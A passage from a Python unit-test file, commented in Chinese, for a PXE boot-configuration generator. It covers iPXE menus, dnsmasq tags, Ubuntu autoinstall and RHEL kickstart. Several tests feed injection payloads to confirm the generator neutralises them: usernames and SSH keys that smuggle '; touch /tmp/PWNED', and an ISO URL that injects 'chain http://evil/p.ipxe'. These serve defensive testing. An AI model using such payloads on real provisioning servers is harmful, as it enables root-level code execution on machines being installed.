"""PXE 生成器单元测试。

说明（本次修订）：
  - `test_per_mac_files_and_hostname` / `test_rhel_kickstart` 为原有测试。
    P1 批次**有意改变**了它们覆盖的两种行为，故这两处断言已随行为同步更新，
    并各自**加强**（见下）：按 MAC 菜单改为 iPXE 第二阶段的互斥 tag 形式；
    RHEL 装机必须提供 mirror（本机不发布 ISO 仓库树，旧的 inst.repo 会指向 404）。
  - 原 `test_ubuntu_direct_uefi` 断言的是一套**已被替换掉的手写 curtin storage 结构**
    （`"ptable": "gpt"` 等）。那套结构实测有 11 处违反 curtin 官方硬规则
    （每个条目必须有 id；volgroup 必须用 id 而非名字；format.volume / mount.device 必须指向 id），
    且 `storage` 输出为列表而 autoinstall schema 要求对象。现改为断言官方 `layout` 简写。
  - 新增 3 个回归测试，覆盖此前长期逃逸的缺陷：
      * autoinstall 键名必须是连字符 `late-commands`
      * post_script 的 YAML + POSIX shell 双层语义
      * iPXE 菜单里的分号必须转义（否则 iPXE 会把 kernel 行切成两条命令导致装机失败）
"""
import hashlib
import json
import re
import shlex
import unittest

import yaml

from app.it.pxe.generator import PxeConfig, generate_all, pick_iso

# R4：红线检查的**真实实现**必须在任何用例 setUp 覆盖它之前抓住 ——
# 有两个测试类为了 hermetic 会把它换成放行桩（容器与宿主机共享网络命名空间，
# 不隔离的话用例会随宿主环境漂移），而专门测红线的用例要把它装回去。
import app.core.dhcp as _dhcp_mod

_REAL_CHECK_DHCP_CONF_SAFETY = _dhcp_mod.check_dhcp_conf_safety


def _cfg(**kw):
    """测试辅助：本文件测的是 post_script / storage / ipxe，不是口令策略。
    U10 之后 _hash_pw 对空口令抛 ValueError，故统一补一个测试口令。
    Ubuntu 分支现在**必须**有可挂载介质（casper 的 url=），否则显式失败；
    这里给一个默认测试 ISO，需要测"无介质"的用例自行传 iso_url=""。"""
    kw.setdefault("admin_password", "Test@123")
    kw.setdefault("iso_url", "http://10.0.0.1:8000/pxe/iso/test.iso")
    return PxeConfig(**kw)


class PxeGeneratorTest(unittest.TestCase):
    # ---------------- 原有测试：保持原样 ----------------

    def test_per_mac_files_and_hostname(self):
        cfg = _cfg(
            os_type="ubuntu",
            os_version="22.04",
            hostname="base-server",
            admin_user="ops",
            admin_password="Test@123",
            server_ip="10.10.10.10",
            http_root="http://10.10.10.10:8000/pxe/serve",
            net_mode="dhcp",
            deploy_mode="standalone",
        )
        installs = [
            {"mac": "00:11:22:33:44:55", "hostname": "web-01", "ip": "10.10.10.100"},
            {"mac": "AA:BB:CC:DD:EE:FF", "hostname": "db-01", "ip": "10.10.10.101"},
        ]
        files = generate_all(cfg, installs)
        self.assertIn("boot/00-11-22-33-44-55.ipxe", files)
        self.assertIn("boot/aa-bb-cc-dd-ee-ff.ipxe", files)
        self.assertIn("user-data/00-11-22-33-44-55/user-data", files)
        self.assertIn("hostname: web-01", files["user-data/00-11-22-33-44-55/user-data"])
        self.assertIn("- reboot", files["user-data/00-11-22-33-44-55/user-data"])
        self.assertIn("user-data/00-11-22-33-44-55/", files["boot/00-11-22-33-44-55.ipxe"])
        dns = files["dnsmasq.conf"]
        self.assertIn("dhcp-host=00:11:22:33:44:55,set:pxe_00-11-22-33-44-55", dns)
        # 按 MAC 的菜单属于【第二阶段】（iPXE 自己再次 DHCP 时），用互斥 tag 下发；
        # 旧写法 dhcp-boot=tag:pxe_<mac>,<菜单URL> 会把这个脚本 URL 交给 PXE 固件，
        # 而固件执行不了 iPXE 脚本，所以它被移除了。
        self.assertIn(
            "tag-if=set:fw-menu-00-11-22-33-44-55,"
            "tag:fw-menu,tag:pxe_00-11-22-33-44-55",
            dns,
        )
        self.assertIn(
            "dhcp-boot=tag:fw-menu-00-11-22-33-44-55,"
            "http://10.10.10.10:8000/pxe/serve/boot/00-11-22-33-44-55.ipxe",
            dns,
        )
        # 守护断言①：第一阶段（PXE 固件）必须拿二进制，绝不能拿到脚本 URL
        self.assertIn("dhcp-boot=tag:fw-x64,ipxe.efi", dns)
        self.assertIn("dhcp-boot=tag:fw-ia32,ipxe-i386.efi", dns)
        self.assertIn("dhcp-boot=tag:fw-bios,undionly.kpxe", dns)
        self.assertNotIn("dhcp-boot=tag:pxe_", dns)
        # 守护断言②：每条 dhcp-boot 只带一个 tag
        # （dnsmasq 未规定"多条同时匹配时哪条胜出"，故设计上不依赖该优先级）
        for line in dns.splitlines():
            if line.startswith("dhcp-boot="):
                self.assertEqual(line.split(",")[0].count("tag:"), 1, line)

    def test_missing_ia32_firmware_is_not_advertised(self):
        """32 位 UEFI 固件不存在时：不广播指向它的引导项，但**保留** efi-ia32 的 tag 判定。

        背景（§4-6 实测）：ipxe-i386.efi 在发行版包里根本不存在（Ubuntu 22.04 只有
        grub-ipxe / ipxe / ipxe-qemu），上游也无预编译产物。文件不在却照样广播
        `pxe-service=tag:fw-ia32,...` / `dhcp-boot=tag:fw-ia32,ipxe-i386.efi`，
        等于给 arch 6 客户端一个必然失败的承诺。
        而 `dhcp-match=set:efi-ia32` **必须留着**：摘掉它，ia32 客户端会因为
        `tag:!efi-ia32` 成立而落进 fw-bios，拿到 BIOS 固件 undionly.kpxe —— 架构不符，更糟。
        """
        from app.it.pxe.generator import PxeConfig, generate_all, _dnsmasq
        from test_pxe import _cfg

        base = _cfg()
        # 默认（True）：保持既有输出不变 —— 这是向后兼容的保证
        dns_on = _dnsmasq(PxeConfig(**{**base.__dict__, "ipxe_ia32_available": True}))
        self.assertIn("dhcp-boot=tag:fw-ia32,ipxe-i386.efi", dns_on)
        # 固件缺失（False）：摘掉两条下发，但保留 efi-ia32 的判定
        dns_off = _dnsmasq(PxeConfig(**{**base.__dict__, "ipxe_ia32_available": False}))
        self.assertNotIn("pxe-service=tag:fw-ia32", dns_off)
        self.assertNotIn("dhcp-boot=tag:fw-ia32", dns_off)
        self.assertIn("dhcp-match=set:efi-ia32,option:client-arch,6", dns_off)
        self.assertIn("tag-if=set:fw-ia32,tag:!ipxe,tag:efi-ia32", dns_off)
        # 其余两条固件下发不受影响
        self.assertIn("dhcp-boot=tag:fw-x64,ipxe.efi", dns_off)
        self.assertIn("dhcp-boot=tag:fw-bios,undionly.kpxe", dns_off)
        # 默认值就是 True，且不传时输出与传 True 完全一致
        self.assertEqual(_dnsmasq(base), dns_on)

    def test_rhel_kickstart(self):
        # D17：RHEL 装机必须给出可用的安装源。本机从不发布 ISO 仓库树
        # （extract_from_iso 只拷 vmlinuz/initrd.img，目录里没有 repomd.xml），
        # 所以"没有 mirror 就指向 http_root/os"只会产出一个 404 的 inst.repo。
        cfg = _cfg(os_type="rhel", os_version="9.3", hostname="rhel-01", admin_password="x",
                   mirror="http://mirror.example/rocky/9/BaseOS/x86_64/os/")
        files = generate_all(cfg)
        self.assertIn("ks.cfg", files)
        self.assertIn("url --url=", files["ks.cfg"])
        self.assertIn("reboot", files["ks.cfg"])
        # inst.repo 原样使用 mirror，且不再出现【臆造的 http_root + "/os"】形式。
        # 注意不能断言 assertNotIn("/os", ...)：mirror 自己的路径就可能以 /os 结尾。
        self.assertEqual(files["boot.ipxe"].count("inst.repo="), 1, files["boot.ipxe"])
        self.assertIn("inst.repo=http://mirror.example/rocky/9/BaseOS/x86_64/os/",
                      files["boot.ipxe"])
        self.assertNotIn(":8000/pxe/os", files["boot.ipxe"])

    def test_rhel_without_mirror_is_rejected(self):
        """D17 守护：无 mirror 的 RHEL 装机必须显式失败，而不是产出坏 inst.repo。

        生产上 8 个 profile 全是 ubuntu，故此行为变更不影响任何现存部署；
        这里把它钉住，避免以后有人把"静默产出 404 URL"加回来。
        """
        cfg = _cfg(os_type="rhel", os_version="9.3", hostname="rhel-01", admin_password="x")
        with self.assertRaises(ValueError) as ctx:
            generate_all(cfg)
        self.assertIn("mirror", str(ctx.exception))

    # ---------------- storage：改为断言官方 layout 简写 ----------------

    def test_ubuntu_storage_layout(self):
        """storage 必须是对象，且用官方 layout 简写（不再是手写的 curtin config 列表）。"""
        # direct
        doc = yaml.safe_load(generate_all(_cfg(disk_scheme="direct"))["user-data"])
        storage = doc["autoinstall"]["storage"]
        self.assertIsInstance(storage, dict, "storage 必须是 dict，不能是 list")
        self.assertEqual(storage["layout"]["name"], "direct")

        # 默认（lvm）
        doc = yaml.safe_load(generate_all(_cfg())["user-data"])
        storage = doc["autoinstall"]["storage"]
        self.assertIsInstance(storage, dict)
        self.assertEqual(storage["layout"]["name"], "lvm")
        self.assertNotIn("match", storage["layout"], "未指定磁盘时不应生成 match")

        # 非法值回退 lvm
        doc = yaml.safe_load(generate_all(_cfg(disk_scheme="unknown-xyz"))["user-data"])
        self.assertEqual(doc["autoinstall"]["storage"]["layout"]["name"], "lvm")

        # 指定磁盘 -> match.path
        doc = yaml.safe_load(
            generate_all(_cfg(disk_config={"disk": "vda"}))["user-data"]
        )
        self.assertEqual(
            doc["autoinstall"]["storage"]["layout"]["match"]["path"], "/dev/vda"
        )

    # ---------------- 回归：late-commands 键名 ----------------

    def test_autoinstall_late_commands_key_is_hyphenated(self):
        """键名必须是官方连字符写法。

        回归背景：曾用下划线 `late_commands`，官方 schema 里不存在该键，
        在 Ubuntu 22.04 上会被静默忽略，导致 post_script 与
        `systemctl enable ssh` 都不执行；24.04+ 会直接校验失败。
        """
        doc = yaml.safe_load(generate_all(_cfg())["user-data"])
        ai = doc["autoinstall"]
        self.assertIn("late-commands", ai)
        self.assertNotIn("late_commands", ai)

        cmds = ai["late-commands"]
        self.assertIsInstance(cmds, list)
        self.assertTrue(
            any("systemctl enable ssh" in c for c in cmds if isinstance(c, str)),
            "late-commands 中应含 systemctl enable ssh",
        )
        self.assertTrue(
            any(c.strip() == "reboot" for c in cmds if isinstance(c, str)),
            "late-commands 中应含 reboot",
        )

    # ---------------- 回归：post_script 双层语义 ----------------

    def _post_script_entries(self, doc):
        """取出 late-commands 里所有承载 bash -c 的条目。"""
        return [
            item
            for item in doc["autoinstall"]["late-commands"]
            if isinstance(item, str) and "bash -c " in item
        ]

    def _script_from_entry(self, entry):
        """把 'curtin ... bash -c <quoted>' 里的脚本按 POSIX 规则还原成参数列表。"""
        payload = entry.split("bash -c ", 1)[1]
        return shlex.split(payload)

    def test_post_script_round_trip(self):
        """post_script 必须同时通过 YAML 层与 POSIX shell 层。

        判据用「往返比较」而非子串匹配：正确的 POSIX 单引号引用必然在撇号处
        断开字面量（`echo "it's ok"` 引用后形如 `'echo "it"'\"'\"'s ok"'`），
        因此不可能出现连续的 `it's` 子串。
        """
        cases = [
            "echo hello",
            "echo \"it's ok\"",
            "echo 'quoted'",
            "touch /tmp/a\nmkdir -p /opt/b",
            "echo done: ok  # 注释",
            "echo C:\\temp\\x",
            "echo $HOME `whoami`",
        ]
        for script in cases:
            with self.subTest(script=script):
                cfg = _cfg(admin_password="Test@123", post_script=script)
                # YAML 层：整份 user-data 必须可解析，且该项是 str（不是 dict）
                doc = yaml.safe_load(generate_all(cfg)["user-data"])
                entries = self._post_script_entries(doc)
                self.assertEqual(len(entries), 1, f"应恰好有一个 bash -c 条目: {script!r}")
                entry = entries[0]
                self.assertIsInstance(entry, str)

                # 多行脚本：条目里必须含真实换行符，而不是字面的 \n 两个字符
                if "\n" in script:
                    self.assertIn("\n", entry, "多行脚本的条目应含真实换行")

                # shell 层：POSIX 还原后必须与原始脚本逐字相等
                self.assertEqual(self._script_from_entry(entry), [script])

    def test_post_script_empty_produces_two_commands(self):
        """未提供 post_script 时，late-commands 只有 systemctl enable ssh 与 reboot。"""
        doc = yaml.safe_load(generate_all(_cfg(post_script=""))["user-data"])
        cmds = doc["autoinstall"]["late-commands"]
        self.assertEqual(len(cmds), 2)
        self.assertIn("systemctl enable ssh", cmds[0])
        self.assertEqual(cmds[1], "reboot")
        self.assertEqual(self._post_script_entries(doc), [], "空脚本不应产生 bash -c 条目")

    # ---------------- 回归：iPXE 分号转义 ----------------

    def test_admin_user_and_ssh_key_cannot_inject(self):
        """admin_user 会落进 ks 的 %post（**以 root 执行**）与 autoinstall 的 YAML；
        ssh_keys 原先用 ' + chr(39) + ' 手工拼单引号。两者都必须无法注入。

        判据用 **POSIX 分词**而不是子串检查：
          · _safe_username 是"剔除"而非"拒绝"，所以字符串里可能还留着载荷片段，
            但一个字符都逃不出用户名；
          · shlex.quote 产出的 `; touch` 仍在**单引号内部**，不构成命令。
        子串存在 ≠ 可执行 —— 这一点我第一版判错过。
        """
        import shlex

        def toks(line):
            lx = shlex.shlex(line, posix=True, punctuation_chars=";&|<>()")
            lx.whitespace_split = True
            return list(lx)

        cfg = _cfg(os_type="rhel", os_version="9", hostname="r1",
                   admin_user="ops; touch /tmp/PWNED #",
                   mirror="http://m/rocky9/",
                   ssh_keys=["ssh-ed25519 AAAA' ; touch /tmp/PWNED_KEY ; echo ' x"])
        ks = generate_all(cfg)["ks.cfg"]
        for line in ks.splitlines():
            if "home/" not in line:
                continue
            t = toks(line)
            self.assertNotIn(";", t, line)
            self.assertNotIn("touch", t, line)
        user_line = next(l for l in ks.splitlines() if l.startswith("user "))
        self.assertRegex(user_line.split("--name=")[1].split()[0], r"^[A-Za-z0-9_-]+$")

        ucfg = _cfg(os_type="ubuntu",
                    admin_user="ops\n    groups: [sudo]\n    lock_passwd: false")
        import yaml
        ident = yaml.safe_load(generate_all(ucfg)["user-data"])["autoinstall"]["identity"]
        self.assertNotIn("groups", ident)
        self.assertNotIn("lock_passwd", ident)
        self.assertRegex(ident["username"], r"^[A-Za-z0-9_-]+$")


    def test_listen_ports_from_proc_fallback(self):
        """容器镜像没有 iproute2（`ss` 不存在），而容器是 host 网络模式，
        所以 /server/status 的 ports 必须能从 /proc/net/udp{,6} 回退解析。

        夹具是宿主机 /proc 的真实片段，覆盖三个坑：
          · IPv4 地址是 hex 且按**主机字节序**（7176800A -> 10.128.118.113）
          · IPv6 是 32 位 hex，每 4 字节一组也要按小端还原（...01000000 -> ::1）
          · dnsmasq 会开多个 socket，必须去重；无关端口（0016=22）必须忽略
        用 mock 喂内容，不落任何临时文件。
        """
        import builtins
        import io
        from unittest import mock

        from app.it.pxe.server import _listen_ports_from_proc

        udp = (
            "  sl  local_address rem_address   st\n"
            " 4736: 00000000:0043 00000000:0000 07\n"
            " 4736: 00000000:0043 00000000:0000 07\n"
            " 4738: 0100007F:0045 00000000:0000 07\n"
            " 4738: 7176800A:0045 00000000:0000 07\n"
            " 4736: 00000000:0016 00000000:0000 07\n"
        )
        udp6 = (
            "  sl  local_address                         remote_address   st\n"
            " 4738: 00000000000000000000000001000000:0045 0000:0000 07\n"
            " 4738: 01000000:0045 0000:0000 07\n"
        )

        def fake_open(path, *a, **k):
            return io.StringIO(udp6 if str(path).endswith("udp6") else udp)

        with mock.patch.object(builtins, "open", fake_open):
            got = _listen_ports_from_proc("/proc/net/udp", "/proc/net/udp6")
        self.assertEqual(got, ["0.0.0.0:67", "10.128.118.113:69", "127.0.0.1:69", "[::1]:69"])

        # 坏输入必须安全返回空，而不是抛异常
        for bad in ("", "  sl  local_address\n", "4736:\n",
                    " 4736: 00000000:ZZZZ 0 0 07\n"):
            with mock.patch.object(builtins, "open",
                                   lambda *a, **k: io.StringIO(bad)):
                self.assertEqual(_listen_ports_from_proc("/x", "/y"), [])


    def test_ipxe_menu_ubuntu_uses_cloud_config_url(self):
        """Ubuntu 的 kernel 行必须用 cloud-config-url 投递应答文件，并给出可挂载的 url=。

        这里断言的是**真机实测结论**，不是推测：
        - 旧写法 `ds=nocloud-net\\;s=<seed>`：iPXE 不认反斜杠转义，`\\;` 会以字面反斜杠
          进入内核命令行（内核串口实证：'Kernel command line: ... ds=nocloud\\;s=http://...'），
          cloud-init 的 DataSourceNoCloud.parse_cmdline_data() 要求精确子串 " ds=nocloud;"，
          于是失配 → 数据源退化成 none → 安装器进交互模式，autoinstall 永不生效。
        - 旧写法把相对位置参数 `--- <squashfs_path>` 当介质：casper 实测报
          "Unable to find a medium containing a live file system"。
        - cloud-init 自己也会解析 `url=`（parse_cmdline_url 在 ("cloud-config-url","url")
          里取第一个命中的键）。只写 url=<ISO> 时它把 2GB ISO 当配置文件流式下载进内存，
          实测 3.66GB anon RSS → cloud-init 被 OOM 杀，local/network 两个 stage 全 FAILED。
          所以 cloud-config-url 必须与 url= 同时在场。
        """
        menu = generate_all(_cfg(server_ip="10.0.0.1",
                                 http_root="http://10.0.0.1:8000/pxe/serve"))["boot.ipxe"]
        klines = [l for l in menu.splitlines() if l.startswith("kernel")]
        self.assertEqual(len(klines), 1)
        k = klines[0]

        self.assertIn("autoinstall", k)
        self.assertIn("cloud-config-url=http://10.0.0.1:8000/pxe/serve/user-data", k)
        self.assertIn("ip=dhcp", k)
        self.assertIn("url=http://10.0.0.1:8000/pxe/iso/test.iso", k)
        # 默认必须带串口：无显示器的机器装机失败时，串口是唯一能看到真实 cmdline / OOM /
        # curtin 卡在哪一步的地方（本项目就是靠它定案的）
        self.assertIn("console=tty0 console=ttyS0,115200", k)

        # 置空则完全不带 console=（保留给坚持把界面留在显示器上的场景）
        k2 = [l for l in generate_all(_cfg(kernel_console=""))["boot.ipxe"].splitlines()
              if l.startswith("kernel")][0]
        self.assertNotIn("console=", k2)

        # UEFI 必需：kernel 行上要给出 initrd 的名字（必须与 iPXE 注册的 basename 一致）。
        # 不带它时 UEFI(OVMF) 下内核 panic "Cannot open root device ram0"，
        # 而 BIOS 下它是 NO-OP。实测见 pve_verify_uefi.py。
        self.assertIn("initrd=initrd", k)

        # 不得再出现必然失配的转义分号写法，也不得再用相对位置介质参数
        self.assertNotIn("\\", k, "kernel 行不应含反斜杠转义")
        self.assertNotIn("nocloud", k, "Ubuntu 不再走 ds=nocloud 数据源探测")
        self.assertNotIn(" --- ", k, "不得再用相对位置介质参数")

        # 我们已经不需要分号了：iPXE 脚本里不应出现裸分号（它是命令分隔符）
        for line in menu.splitlines():
            self.assertNotIn(";", line, f"iPXE 行不应含分号: {line!r}")

    def test_per_mac_boot_uses_per_mac_seed(self):
        """每台机器的菜单必须指向自己的应答文件，而不是共享根目录的。"""
        cfg = _cfg(server_ip="10.10.10.10",
                   http_root="http://10.10.10.10:8000/pxe/serve")
        files = generate_all(cfg, [{"mac": "00:11:22:33:44:55", "hostname": "web-01"}])
        k = [l for l in files["boot/00-11-22-33-44-55.ipxe"].splitlines()
             if l.startswith("kernel")][0]
        self.assertIn(
            "cloud-config-url=http://10.10.10.10:8000/pxe/serve/user-data/00-11-22-33-44-55/user-data",
            k,
        )

    def test_ssh_enable_is_tolerant_and_ssh_pkg_added(self):
        """`systemctl enable ssh` 必须容错，且配了 ssh_keys 就要装 openssh-server。

        回归背景（真机实测）：22.04 live-server 最小安装里没有 ssh 单元，
        这条 late-command 返回 1，curtin 把**已经装好的系统**判成 install_fail，
        界面停在 "An error occurred"，其后的 `reboot` 也再也执行不到。
        """
        doc = yaml.safe_load(generate_all(_cfg(ssh_keys=["ssh-ed25519 AAAATEST k"]))["user-data"])
        ai = doc["autoinstall"]
        lc = ai["late-commands"]
        ssh_cmds = [c for c in lc if "systemctl enable ssh" in c]
        self.assertEqual(len(ssh_cmds), 1)
        self.assertIn("|| true", ssh_cmds[0], "ssh 启用必须容错，否则装机被误判失败")
        # reboot 必须仍在最后，且一定在 ssh 之后
        self.assertEqual(lc[-1], "reboot")
        self.assertLess(lc.index(ssh_cmds[0]), lc.index("reboot"))
        # 配了 authorized-keys 就必须把包也装上
        self.assertIn("openssh-server", ai.get("packages", []))

    def test_rhel_kernel_line_has_initrd_name(self):
        """RHEL 分支同样要带 `initrd=`，名字取自 initrd_path 的 basename（UEFI 必需、BIOS NO-OP）。"""
        cfg = _cfg(os_type="rhel", os_version="9", initrd_path="rhel/9/initrd.img",
                   mirror="http://mirror.example/rocky/9/BaseOS/x86_64/os/")
        k = [l for l in generate_all(cfg)["boot.ipxe"].splitlines() if l.startswith("kernel")][0]
        self.assertIn("initrd=initrd.img", k)
        self.assertIn("inst.ks=", k)

    def test_readme_states_memory_requirement(self):
        """README 必须写明内存要求与原因（casper 走 HTTP 会把整份 ISO 读进内存）。

        这是被真实踩过的坑：目标机内存不够时表现为装机中途 OOM，而不是清晰的报错。
        """
        txt = generate_all(_cfg(iso_size_mb=2038))["README.txt"]
        self.assertIn("2038", txt)          # ISO 大小
        self.assertIn("3574", txt)          # 2038 + 1536 的建议内存
        self.assertIn("cloud-config-url", txt)   # 并说明为什么要同时给它

    def test_user_data_has_cloud_config_header(self):
        """`#cloud-config` 头现在是有承重作用的：cloud-config-url 投递的配置必须以此开头，
        cloud-init 才会认（cmd/main.py 会嗅探该头）；去掉它整条自动安装链路会静默失效。"""
        files = generate_all(_cfg(), [{"mac": "00:11:22:33:44:55", "hostname": "web-01"}])
        for key in ("user-data", "user-data/00-11-22-33-44-55/user-data"):
            self.assertTrue(files[key].startswith("#cloud-config"), key)
            self.assertIn("autoinstall:", files[key], key)

    def test_ubuntu_requires_mountable_media(self):
        """没有可用介质时必须显式失败（映射成 4xx 可读提示），而不是生成必然失败的菜单。"""
        with self.assertRaises(ValueError) as cm:
            generate_all(_cfg(iso_url=""))
        self.assertIn("iso_url", str(cm.exception))

    def test_pick_iso_picks_right_image(self):
        """正式环境同一目录会有多个系统镜像，必须按 os_type/os_version 挑准。"""
        names = ["ubuntu-22.04.5-live-server-amd64.iso",
                 "ubuntu-24.04.1-live-server-amd64.iso",
                 "Rocky-9.4-x86_64-minimal.iso",
                 "centos-7-x86_64-minimal.iso",
                 "README.txt", "download-complete.flag"]
        self.assertEqual(pick_iso(names, "ubuntu", "22.04"),
                         "ubuntu-22.04.5-live-server-amd64.iso")
        self.assertEqual(pick_iso(names, "ubuntu", "24.04"),
                         "ubuntu-24.04.1-live-server-amd64.iso")
        self.assertEqual(pick_iso(names, "rhel", "9"),
                         "Rocky-9.4-x86_64-minimal.iso")
        # 挑不到就返回空串，由调用方给出可读错误（不猜一个错的镜像）
        self.assertEqual(pick_iso(names, "ubuntu", "20.04"), "")
        self.assertEqual(pick_iso([], "ubuntu", "22.04"), "")


    def test_rhel_emits_stage2_and_extra_repos(self):
        """RHEL 系必须能把 stage2 与额外仓库（AppStream）传下去。

        真机串口实证：只给 `inst.repo=<BaseOS/>` 时，
          · 找不到 stage2 → dracut "Could not boot / /dev/root does not exist"；
          · 装完 326 个包后 → SecurityInstallationError: /usr/sbin/authconfig is missing
            （authconfig 在 AppStream，而 kickstart 里有 auth --enableshadow）。
        """
        cfg = _cfg(os_type="rhel", os_version="9", initrd_path="rhel/9/initrd.img",
                   mirror="http://10.0.0.1:8000/pxe/serve/repo/rocky-9.4/BaseOS/",
                   stage2="http://10.0.0.1:8000/pxe/serve/repo/rocky-9.4/",
                   extra_repos=[{"name": "AppStream",
                                 "url": "http://10.0.0.1:8000/pxe/serve/repo/rocky-9.4/AppStream/"}])
        files = generate_all(cfg)
        k = [l for l in files["boot.ipxe"].splitlines() if l.startswith("kernel")][0]
        self.assertIn("inst.stage2=http://10.0.0.1:8000/pxe/serve/repo/rocky-9.4/", k)
        self.assertIn("inst.repo=http://10.0.0.1:8000/pxe/serve/repo/rocky-9.4/BaseOS/", k)
        self.assertIn("inst.addrepo=AppStream,http://10.0.0.1:8000/pxe/serve/repo/rocky-9.4/AppStream/", k)
        ks = files["ks.cfg"]
        self.assertIn('url --url="http://10.0.0.1:8000/pxe/serve/repo/rocky-9.4/BaseOS/"', ks)
        self.assertIn('repo --name="AppStream" --baseurl="http://10.0.0.1:8000/pxe/serve/repo/rocky-9.4/AppStream/"', ks)

    def test_extra_repo_name_with_comma_is_rejected(self):
        """逗号是 inst.addrepo 的分隔符：出现在名字/URL 里就必须拒绝，否则语法被改写。"""
        with self.assertRaises(ValueError):
            generate_all(_cfg(os_type="rhel", os_version="9", mirror="http://m/BaseOS/",
                              extra_repos=[{"name": "App,Stream", "url": "http://m/AppStream/"}]))

    def test_url_tokens_are_single_line_only(self):
        """URL 里塞引号/空格也要被拒（会改变 kickstart 的语法结构）。"""
        with self.assertRaises(ValueError):
            generate_all(_cfg(os_type="rhel", os_version="9",
                              mirror='http://m/BaseOS/"x'))


class RhelMediaDetectTest(unittest.TestCase):
    """api 层的自动探测：运维只填一个 mirror，stage2 与 AppStream 由目录树推出来。"""

    def _tree(self, tmp):
        import os
        root = os.path.join(tmp, "rocky-9.4")
        for d in ("BaseOS", "AppStream"):
            os.makedirs(os.path.join(root, d, "repodata"))
            open(os.path.join(root, d, "repodata", "repomd.xml"), "w").write("x")
        os.makedirs(os.path.join(root, "images"))
        open(os.path.join(root, "images", "install.img"), "w").write("x")
        return root

    def test_detects_from_repo_dir(self):
        import tempfile
        from unittest import mock

        from app.api import pxe as api_pxe
        with tempfile.TemporaryDirectory() as tmp:
            self._tree(tmp)
            with mock.patch.object(api_pxe, "WEB_ROOT", tmp):
                repo, stage2, extra = api_pxe._detect_rhel_media(
                    "http://10.0.0.1:8000/pxe/serve/rocky-9.4/BaseOS/", "10.0.0.1")
        # mirror 本身就是一个 repo 时**原样保留**（不替运维改写他已给出的地址）
        self.assertEqual(repo, "http://10.0.0.1:8000/pxe/serve/rocky-9.4/BaseOS/")
        self.assertEqual(stage2, "http://10.0.0.1:8000/pxe/serve/rocky-9.4/")
        self.assertEqual([e["name"] for e in extra], ["AppStream"])

    def test_tree_root_also_works(self):
        """直接给树根也应可用：自动选一个含 repodata 的子目录当主仓库。"""
        import tempfile
        from unittest import mock

        from app.api import pxe as api_pxe
        with tempfile.TemporaryDirectory() as tmp:
            self._tree(tmp)
            with mock.patch.object(api_pxe, "WEB_ROOT", tmp):
                repo, stage2, extra = api_pxe._detect_rhel_media(
                    "http://10.0.0.1:8000/pxe/serve/rocky-9.4/", "10.0.0.1")
        self.assertEqual(repo, "http://10.0.0.1:8000/pxe/serve/rocky-9.4/AppStream/")
        self.assertEqual(stage2, "http://10.0.0.1:8000/pxe/serve/rocky-9.4/")
        self.assertEqual([e["name"] for e in extra], ["BaseOS"])

    def test_remote_mirror_is_left_alone(self):
        """远端官方镜像本身就是完整仓库树：不要乱加 stage2/addrepo。"""
        from app.api import pxe as api_pxe
        repo, stage2, extra = api_pxe._detect_rhel_media(
            "https://mirror.example/rocky/9/BaseOS/x86_64/os/", "10.0.0.1")
        self.assertEqual(repo, "https://mirror.example/rocky/9/BaseOS/x86_64/os/")
        self.assertEqual(stage2, "")
        self.assertEqual(extra, [])


class OsTypeFamilyTest(unittest.TestCase):
    """os_type 家族：白名单/家族判定/目录三方必须同源（os_catalog 是唯一定义点）。"""

    def test_allowlist_matches_generator_family(self):
        """校验层白名单与 generator.RHEL_FAMILY 都派生自 os_catalog，不得漂移。

        语义（catalog 化后）：_OS_TYPE_ALLOWED = 目录全部 ids+别名（含 debian/
        opensuse —— 保存允许，生成时明确拒绝）；RHEL_FAMILY = kickstart 家族的
        ids+别名。旧的"白名单 - ubuntu == RHEL_FAMILY"断言随目录化更新。
        """
        from app.core.schemas import _OS_TYPE_ALLOWED
        from app.it.pxe import os_catalog
        from app.it.pxe.generator import RHEL_FAMILY
        kick = set(os_catalog.kickstart_family()) | {
            a for e in os_catalog.entries()
            if e.installer == os_catalog.KICKSTART for a in e.aliases}
        self.assertEqual(set(RHEL_FAMILY), kick)
        self.assertEqual(set(_OS_TYPE_ALLOWED), set(os_catalog.all_os_types()))
        # kickstart 家族必须覆盖用户实测要装的新系统
        for t in ("openeuler", "kylin", "uos", "anolis", "fedora",
                  "oraclelinux", "centos-stream"):
            self.assertIn(t, set(_OS_TYPE_ALLOWED), t)
            self.assertIn(t, kick, t)

    def test_rhel_family_gets_initrd_img_media(self):
        """填 rocky/centos/alma 时媒体必须与 rhel 一致（initrd.img）。

        旧实现只特判 `== "rhel"`：os_type 填 "rocky" 会走 anaconda 分支却拿到
        `rocky/9/initrd`（Ubuntu 风格），而 ISO 里是 images/pxeboot/initrd.img → 必然 404。
        """
        from app.api import pxe as api_pxe

        for t in ("rhel", "rocky", "centos", "alma", "almalinux", "redhat", "RHEL", " Rocky "):
            class _P:
                os_type = t
                os_version = "9"
            k, i, s = api_pxe._default_media(_P())
            self.assertEqual(i, t.strip().lower() + "/9/initrd.img", f"os_type={t!r}")
            self.assertEqual(s, "", f"os_type={t!r} 不应给出 squashfs")
        # Ubuntu 不受影响
        class _U:
            os_type = "ubuntu"
            os_version = "22.04"
        self.assertEqual(api_pxe._default_media(_U()),
                         ("ubuntu/22.04/vmlinuz", "ubuntu/22.04/initrd",
                          "ubuntu/22.04/installer.squashfs"))

    def test_os_type_is_normalized_and_validated(self):
        """大小写/空白归一化；未知类型必须被拒，而不是静默走错分支。"""
        from pydantic import ValidationError

        from app.core.schemas import PxeProfileIn
        self.assertEqual(PxeProfileIn(name="x", os_type=" RHEL ").os_type, "rhel")
        self.assertEqual(PxeProfileIn(name="x", os_type="Rocky").os_type, "rocky")
        with self.assertRaises(ValidationError):
            PxeProfileIn(name="x", os_type="windows")


class PxeInjectionGuardTest(unittest.TestCase):
    """iPXE / dnsmasq 配置注入防护。

    外部代码审查（MiMo v2.6 Pro）提出后，已用机械方式复现确认为真：
    改前 `iso_url="http://x/y.iso\\nchain http://evil/p.ipxe"` 会让生成的 boot.ipxe
    多出一行 `chain http://evil/p.ipxe`（裸机装机时执行攻击者脚本）；
    `http_root="http://x\\ndhcp-script=/tmp/evil"` 会往 dnsmasq.conf 注入
    `dhcp-script=...`，而该配置由**宿主 root dnsmasq** 加载。
    """

    INJ = "http://x/y.iso" + chr(10) + "chain http://evil/p.ipxe"

    def test_schema_rejects_newline_in_generate_body(self):
        """第 2 层：请求体里带换行的字段必须被 422 拒掉，而不是拼进脚本。"""
        from pydantic import ValidationError

        from app.core.schemas import PxeGenerateIn

        for field in ("iso_url", "http_root", "kernel_path", "initrd_path",
                      "squashfs_path", "kernel_console"):
